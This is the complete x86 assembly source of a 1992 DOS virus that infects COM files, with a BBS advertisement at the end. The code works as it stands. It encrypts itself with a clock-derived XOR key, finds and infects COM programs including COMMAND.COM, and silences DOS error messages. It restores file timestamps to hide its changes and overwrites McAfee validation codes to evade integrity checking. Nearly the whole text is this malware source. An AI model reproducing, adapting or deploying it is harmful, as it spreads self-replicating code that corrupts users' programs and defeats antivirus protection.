            Org 0h                              ; Generate .BIN file

Start:      Jmp MainVir                         ; Jump to decryptor code at EOF

            Db '*'                              ; Virus signature (very short)

;
; Decryptor procedure
;

MainVir:    Call On1                            ; Push offset on stack

On1:        Pop BP                              ; Calculate virus offset
            Sub BP,Offset MainVir+3             ;

            Push Ax                             ; Save possible error code

            Lea Si,Crypt[BP]                    ; Decrypt the virus with a
            Mov Di,Si                           ; very simple exclusive or
            Mov Cx,CryptLen                     ; function.
Decrypt:    Lodsb                               ;
            Xor Al,0                            ;
            Stosb                               ;
            Loop Decrypt                        ;

DecrLen     Equ $-MainVir                       ; Length of the decryptor

;
; Main initialization procedure
;

Crypt:      Mov Ax,Cs:OrgPrg[BP]                ; Store begin of host at
            Mov Bx,Cs:OrgPrg[BP]+2              ; cs:100h (begin of com)
            Mov Cs:Start+100h,Ax                ;
            Mov Cs:Start[2]+100h,Bx             ;

            Xor Ax,Ax                           ; Get original interrupt 24
            Push Ax                             ; (critical error handler)
            Pop Ds                              ;
            Mov Bx,Ds:[4*24h]                   ;
            Mov Es,Ds:[4*24h]+4                 ;

            Mov Word Ptr Cs:OldInt24[Bp],Bx     ; And store it on a save place
            Mov Word Ptr Cs:OldInt24+2[Bp],Es   ;

            Lea Bx,NewInt24[Bp]                 ; Install own critical error
            Push Cs                             ; handler to avoid messages
            Pop Es                              ; when a disk is write
            Mov Word Ptr Ds:[4*24h],Bx          ; protected and such things
            Mov Word Ptr Ds:[4*24h]+2,Es        ;
            Push Cs                             ;
            Pop Ds                              ;

            Mov Ah,30h                          ; Check if DOS version is
            Int 21h                             ; 3.0 or above for correct
            Cmp Al,3                            ; interrupt use
            Jae NoCLean                         ;
            Jmp Ready

NoClean:    Mov Ah,1ah                          ; Store DTA at safe place
            Mov Dx,0fd00h                       ;
            Int 21h                             ;

            Mov Ah,4eh                          ; FindFirsFile Function

Search:     Lea Dx,FileSpec[BP]                 ; Search for filespec given
            Xor Cx,Cx                           ; in FileSpec adress
            Int 21h                             ;
            Jnc Found                           ; Found - Found
            Jmp Ready                           ; Not Found - Ready

Found:      Mov Ax,4300h                        ; Get file attributes and
            Mov Dx,0fd1eh                       ; store them on the stack
            Int 21h                             ;
            Push Cx                             ;

            Mov Ax,4301h                        ; clear file attributes
            Xor Cx,Cx                           ;
            Int 21h                             ;

            Mov Ax,3d02h                        ; open file with read/write
            Int 21h                             ; access

            Mov Bx,5700h                        ; save file date/time stamp
            Xchg Ax,Bx                          ; on the stack
            Int 21h                             ;
            Push Cx                             ;
            Push Dx                             ;

            Mov Ah,3fh                          ; read the first 4 bytes of
            Lea Dx,OrgPrg[BP]                   ; the program onto OrgPrg
            Mov Cx,4                            ;
            Int 21h                             ;

            Mov Ax,Cs:[OrgPrg][BP]              ; Check if renamed exe-file
            Cmp Ax,'ZM'                         ;
            Je ExeFile                          ;

            Cmp Ax,'MZ'                         ; Check if renamed weird exe-
            Je ExeFile                          ; file

            Mov Ah,Cs:[OrgPrg+3][BP]            ; Check if already infected
            Cmp Ah,'*'                          ;
            Jne Infect                          ;

ExeFile:    Call Close                          ; If one of the checks is yes,
            Mov Ah,4fh                          ; close file and search next
            Jmp Search                          ; file

FSeek:      Xor Cx,Cx                           ; subroutine to jump to end
            Xor Dx,Dx                           ; or begin of file
            Int 21h                             ;
            Ret                                 ;

Infect:     Mov Ax,0fd1e[0]                     ; check if the file is
            Cmp Ax,'OC'                         ; COMMAN?.COM (usually result
            Jne NoCommand                       ; if COMMAND.COM)
            Mov Ax,0fd1e[2]                     ;
            Cmp Ax,'MM'                         ;
            Jne NoCommand                       ;
            Mov Ax,0fd1e[4]                     ;
            Cmp Ax,'NA'                         ;
            Jne NoCommand                       ;

            Mov Ax,4202h                        ; Jump to EOF
            Call Fseek                          ;

            Cmp Ax,0f000h                       ; Check if file too large
            Jae ExeFile

            Cmp Ax,VirS                         ; Check if file to short
            jbe ExeFile
            
            Sub     Ax,VirS  
            Xchg    Cx,Dx
            Mov     Dx,4200h
            Xchg    Dx,Ax
            Mov     EOFminVir[BP],Dx
            Int     21h
            Mov     Ah,3fh
            Mov     Dx,Offset Buffer
            Mov     Cx,VirS  
            Int     21h
            Cld
            Mov     Si,Offset Buffer
            Mov     Cx,VirLen
On5:
            Push    Cx
On6:        Lodsb
            Cmp     Al,0
            Jne     On4
            Loop    On6
On4:        Cmp     Cx,0
            Je      Found0

            Pop     Cx
            Cmp     Si,SeekLen
            Jb      On5
            Jmp     NoCommand

Found0:     Pop     Cx
            Sub     Si,Offset Buffer
            Sub     Si,Cx
            Xor     Cx,Cx
            Mov     Dx,EOFminVir[BP]
            Add     Dx,Si

            Mov     Ax,4200h
            Int     21h
            Jmp     CalcVirus

EOFminVir   Dw 0

NoCommand:  Mov Ax,4202h                        ; jump to EOF
            Call FSeek                          ;

            Cmp Ax,0f000h                       ; Check if file too large
            Jb NoExe1                           ; if yes, goto exefile
            Jmp ExeFile                         ;

NoExe1:     Cmp Ax,10                           ; Check if file too short
            Ja NoExe2                           ; if yes, goto exefile
            Jmp ExeFile                         ;


NoExe2:     Mov Cx,Dx                           ; calculate pointer to offset
            Mov Dx,Ax                           ; EOF-52 (for McAfee validation
            Sub Dx,52                           ; codes)

            Mov Si,Cx                           ; move file pointer to the
            Mov Di,Dx                           ; calculated address
            Mov Ax,4200h                        ;
            Int 21h                             ;

            Mov Ah,3fh                          ; read the last 52 bytes
            Mov Dx,0fb00h                       ; of the file
            Mov Cx,52                           ;
            Int 21h                             ;

            Cmp Ds:0Fb00h,0fdf0h                ; check if protected with the
            Jne Check2                          ; AG option
            Cmp Ds:0fb02h,0aac5h                ;
            Jne Check2                          ;

            Mov Ax,4200h                        ; yes - let virus overwrite
            Mov Cx,Si                           ; the code with itself, so
            Mov Dx,Di                           ; the file has no validation
            Int 21h                             ; code
            Jmp CalcVirus                       ;

Check2:     Cmp Ds:0Fb00h+42,0fdf0h             ; check if protected with the
            Jne Eof                             ; AV option
            Cmp Ds:0Fb02h+42,0aac5h             ;
            Jne Eof                             ;

            Mov Ax,4200h                        ; yes - let virus overwrite
            Mov Cx,Si                           ; the code with itself, so
            Mov Dx,Di                           ; the file has no validation
            Add Dx,42                           ; code
            Int 21h                             ;
            Jmp CalcVirus                       ;

Eof:        Mov Ax,4202h                        ; not AG or AV - jump to
            Call Fseek                          ; EOF

CalcVirus:  Sub Ax,3                            ; calculate the jump for the
            Mov Cs:CallPtr[BP]+1,Ax             ; virus start

GetCrypt:   Mov Ah,2ch                          ; get 100s seconds for the
            Int 21h                             ; encryption value.
            Cmp Dl,0                            ; if not zero, goto NoZero
            Jne NoZero                          ;
            Jmp GetCrypt                        ;

NoZero:     Mov Cs:Decrypt+2[BP],Dl             ; Store key into decryptor

            Lea Si,MainVir[BP]                  ; Move changed decryptor to
            Mov Di,0fb00h                       ; a safe place in memory
            Mov Cx,DecrLen                      ;
            Rep Movsb                           ;

            Lea Si,Crypt[BP]                    ; Encrypt the virus and merge
            Mov Cx,CryptLen                     ; it to the changed decryptor
Encrypt:    Lodsb                               ; code
            Xor Al,Dl                           ;
            Stosb                               ;
            Loop Encrypt                        ;

            Mov Ah,40h                          ; append virus at EOF or over
            Lea Dx,0fb00h                       ; the validation code of
            Mov Cx,VirLen                       ; McAfee
            Int 21h                             ;

            Mov Ax,4200h                        ; Jump to BOF
            Call FSeek                          ;

            Mov Ah,40h                          ; Write Jump at BOF
            Lea Dx,CallPtr[BP]                  ;
            Mov Cx,4                            ;
            Int 21h                             ;

            Call Close                          ; Jump to Close routine

Ready:      Mov Ah,1ah                          ; Restore DTA to normal
            Mov Dx,80h                          ; offset
            Int 21h                             ;

            Mov Ax,Cs:OldInt24[Bp]              ; remove critical error
            Mov Dx,Cs:OldInt24+2[Bp]            ; handler and store the
            Xor Bx,Bx                           ; original handler at the
            Push Bx                             ; interrupt table
            Pop Ds                              ;
            Mov Ds:[4*24h],Dx                   ;
            Mov Ds:[4*24h]+2,Ax                 ;
            Push Cs                             ;
            Pop Ds                              ;

            Pop Ax                              ; restore possible error code

            Mov Bx,100h                         ; nice way to jump to the
            Push Cs                             ; begin of the original host
            Push Bx                             ; code
            Retf                                ;

            Db ' (C) 1992 John Tardy / Trident '

Close:      Pop Si                              ; why???

            Pop Dx                              ; restore file date/time
            Pop Cx                              ; stamp
            Mov Ax,5701h                        ;
            Int 21h                             ;

            Mov Ah,3eh                          ; close file
            Int 21h                             ;

            Mov Ax,4301h                        ; restore file attributes
            Pop Cx                              ;
            Mov Dx,0fd1eh                       ;
            Int 21h                             ;

            Push Si                             ; why???
            Ret

;           Db 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
            Db ' Satan spawn, the Caco-Daemon - Mor(T)alities Death '

;
; New critical error handler
;

NewInt24:   Mov Al,3                            ; supress any critical error
            Iret                                ; messages

OldInt24    Dd 0                                ; storage place for old int 24

CallPtr     Db 0e9h,0,0                         ; jump to place at BOF

FileSpec    Db '*.COM',0                        ; filespec and infection marker

OrgPrg:     Int 20h                             ; original program
            Db 'JT'                             ;

CryptLen    Equ $-Crypt                         ; encrypted part length

VirLen      Equ $-MainVir                       ; total virus length

Buffer      Equ 0f040h                          ; buffer offset
VirS        Equ VirLen*2

SeekLen     Equ Buffer+Virs

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
